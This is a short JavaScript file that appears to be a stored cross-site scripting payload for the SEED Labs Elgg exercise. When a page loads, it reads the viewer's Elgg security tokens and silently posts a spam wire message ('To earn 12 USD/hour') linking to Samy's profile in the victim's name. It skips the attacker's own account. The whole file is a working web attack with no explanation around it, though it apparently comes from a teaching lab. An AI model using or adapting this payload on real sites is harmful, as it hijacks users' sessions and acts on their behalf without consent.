{/* <script type="text/javascript"> */ }
window.onload = function () {
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var body = "To earn 12 USD/hour, visit now http://www.seed-server.com/profile/samy";
    var sendurl = "http://www.seed-server.com/action/thewire/add";

    var keys = ["__elgg_token", "__elgg_ts", "body"]
    var values = [token, ts, body];

    var content = "";
    for (var i = 0; i < keys.length; i++) {
        content += keys[i] + "=" + values[i] + "&";
    }

    if (elgg.session.user.guid != 59) {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
// </script>
